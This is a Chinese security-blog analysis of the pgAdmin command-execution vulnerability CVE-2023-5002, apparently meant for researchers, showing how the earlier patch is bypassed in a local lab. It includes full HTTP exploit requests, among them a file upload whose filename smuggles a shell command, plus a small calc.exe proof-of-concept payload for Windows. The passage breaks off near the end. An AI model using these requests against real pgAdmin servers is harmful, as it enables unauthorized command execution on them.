---
title: pgAdmin后台命令执行漏洞（CVE-2023-5002）分析
url: https://www.secpulse.com/archives/205142.html
source: 安全脉搏
date: 2025-02-07
fetch_date: 2025-10-06T20:33:32.088251
---

# pgAdmin后台命令执行漏洞（CVE-2023-5002）分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# pgAdmin后台命令执行漏洞（CVE-2023-5002）分析

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-02-06

29,979

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629395.png)

我们可以看到针对于漏洞 CVE-2022-4223，官方做了一定的修复措施。

web\pgadmin\misc\_\_init\_\_.py#validate\_binary\_path

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629396.png)

首先是添加了 `@login_required` 进行权限校验。在 Flask 框架中，`@login_required` 装饰器通常与 Flask-Login 扩展一起使用。Flask-Login 提供了简单而强大的用户身份验证功能，其中包括 `@login_required` 装饰器用于保护需要登录用户才能访问的视图。当在一个函数、方法或类上应用 `@login_required` 装饰器时，它会检查当前用户是否已经登录。如果用户未登录，则会将其重定向到登录页面或返回相应的错误信息，而不允许访问被装饰的代码块。

添加了权限校验之后，这个漏洞就从未授权的前台漏洞，转换为需要登录的后台漏洞了。

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629398.png)

同时对传入的路径进行校验，通过 `os.path.exists` 来判断是否存在。

### linux

我们发现会对传入的路径进行校验的，那么在linux 下，我们可以通过在服务器上上传一个包含恶意文件名的文件，来进行绕过。

可以从 docker hub 上搜索 docker 资源

<https://hub.docker.com/search?q=pgadmin>

```
docker pull dpage/pgadmin4:7.6
docker run -e 'PGADMIN_DEFAULT_EMAIL=test@example.com' -e 'PGADMIN_DEFAULT_PASSWORD=123456'  -p 5050:80 --name pgadmin -d  docker.io/dpage/pgadmin4:7.6
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629399.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629400.png)

登录后台工具->存储管理器

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629401.png)

上传一个包含恶意文件名的文件

```
POST /file_manager/filemanager/3395111/ HTTP/1.1
Host: 127.0.0.1:5050
Content-Length: 491
X-pgA-CSRFToken: ImE3NDYzOGJhOWYxNDIzY2QzZDUwNTI3MWMzOGU4NGNhMmNhNzkzYTQi.Zi8ctA._DuZsbw2SE05kwuVkqgG7Y-KsjE
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryihDQGI2B09k9alLf
Origin: http://127.0.0.1:5050
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:5050/browser/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pga4_session=2397843f-fbe6-4481-947e-e30f73c6a0ee!GPxXiZuTJzjVn+sk6vhlLNAmjhQr6xIY0yumFSIGBAQ=; PGADMIN_LANGUAGE=zh
Connection: close

------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="newfile"; filename="\";id;#"
Content-Type: text/plain

123
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="mode"

add
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="currentpath"

/
------WebKitFormBoundaryihDQGI2B09k9alLf
Content-Disposition: form-data; name="storage_folder"

my_storage
------WebKitFormBoundaryihDQGI2B09k9alLf--
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629402.png)

同时可以得到在文件在服务器上的路径

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629403.png)

打开文件->配置

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629404.png)

路径->二进制路径->填入恶意文件的位置

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629405.png)

点击运行

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629406.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629407.png)

### windows

下载软件并进行安装

<https://ftp.postgresql.org/pub/pgadmin/pgadmin4/v6.21/windows/pgadmin4-6.21-x64.exe>

需要把C:\Users\username\AppData\Local\Programs\pgAdmin 4\v5\web 下的config.py 修改 DEFAULT\_SERVER \= '0.0.0.0'

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629408.png)

因为windows 无法利用拼接来执行命令，所以还是要想办法成功加载文件才行。

```
import os
binary_path = "\\\\192.168.222.128\\TMP\\"
UTILITIES_ARRAY = ['pg_dump', 'pg_dumpall', 'pg_restore', 'psql']
for utility in UTILITIES_ARRAY:
    full_path = os.path.abspath(
        os.path.join(binary_path, (utility if os.name != 'nt' else (utility + '.exe')))
    )
    print(full_path)
    print(os.path.exists(full_path))
```

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629409.png)

windows 不能再利用共享资源来实现，所以也构造一个exe 上传并执行。

编译恶意的exe文件并放到上传

* pip install pyinstaller
* type execute\_calc.py

  ```
  import subprocess

  def execute_calc():
      subprocess.call("calc.exe")

  if __name__ == "__main__":
      execute_calc()
  ```
* pyinstaller --onefile execute\_calc.py

和linux启动有所不同

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629410.png)

Tools->import

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629411.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629412.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629413.png)

成功将恶意文件上传到服务器上。

同时构造请求数据包

```
POST /misc/validate_binary_path HTTP/1.1
Host: 192.168.222.145:5050
X-pgA-CSRFToken: IjU4MzQ0OTM2Yzc3YzM5ZmE5Yjg0MjRhODVlNzkzZjM5MTViZDBmNzki.Zi9GcQ.pGwCjLqPq3fNzohIRNerpipIRK8
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Origin: http://192.168.222.145:5050
Referer: http://192.168.222.145:5050/browser/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pga4_session=e6f521fc-e9f4-4c58-bf0a-e9abafb4ceb5!JG7fBzRT4FkugKb175t9vWdZpKmAtnbo0d/oPzcAbFI=; PGADMIN_LANGUAGE=en
Connection: close
Content-Type: application/json
Content-Length: 39

{"utility_path":"C:\\Users\\whippet\\"}
```

![2](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629414.gif)

可能是因为本地测试的原因，后来尝试的时候发现，本地去调用共享文件时，可以接收到请求，但是很快就断开连接，所以最后的结果是 False。

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202406211629415.png)

![4](https://m-125433110...